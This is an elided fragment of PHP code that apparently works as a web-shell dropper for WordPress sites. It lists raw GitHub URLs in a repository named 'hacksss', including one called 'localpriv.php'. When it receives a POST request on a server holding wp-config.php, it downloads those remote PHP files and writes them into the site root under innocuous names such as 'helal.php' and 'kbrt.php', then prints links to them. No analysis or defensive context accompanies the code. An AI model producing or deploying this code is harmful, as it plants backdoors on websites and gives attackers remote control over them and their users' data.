...
$url2 = 'https://raw.githubusercontent.com/tlhkpln/hacksss/main/localpriv.php';
$url3 = 'https://raw.githubusercontent.com/tlhkpln/hacksss/main/by.php';
$url4 = 'https://raw.githubusercontent.com/tlhkpln/hacksss/main/sigar.php';
...
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (file_exists($rootDir . '/wp-config.php')) {
        ...
        $path3 = $rootDir . '/helal.php';
        if (!file_exists($path3)) {
            try {
                file_put_contents($path3, download_content($url3));
                echo "<a href='" . get_full_url($path3) . "' target='_blank'>Created: " . get_full_url($path3) . "</a><br>";
            } catch (Exception $e) {
                echo "<div>Error creating file: " . $e->getMessage() . "</div><br>";
            }
        }

        $path4 = $rootDir . '/kbrt.php';
        if (!file_exists($path4)) {
            try {
                file_put_contents($path4, download_content($url4));
                echo "<a href='" . get_full_url($path4) . "' target='_blank'>Created: " . get_full_url($path4) . "</a><br>";
            } catch (Exception $e) {
                echo "<div>Error creating file: " . $e->getMessage() . "</div><br>";
            }
        }
